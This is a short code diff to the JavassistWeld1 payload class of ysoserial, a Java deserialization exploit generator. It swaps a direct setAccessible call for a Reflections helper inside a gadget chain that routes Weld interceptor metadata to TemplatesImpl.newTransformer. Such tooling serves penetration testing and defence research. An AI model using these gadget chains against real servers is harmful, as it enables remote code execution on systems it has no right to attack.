@@ -20,6 +20,7 @@ import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.JavaVersion;
 import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
 
 import java.lang.reflect.Constructor;
 import java.util.*;
@@ -50,7 +51,7 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
         s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
 
         Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
-        defaultMethodMetadataConstructor.setAccessible(true);
+        Reflections.setAccessible(defaultMethodMetadataConstructor);
         MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
                 MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));
 
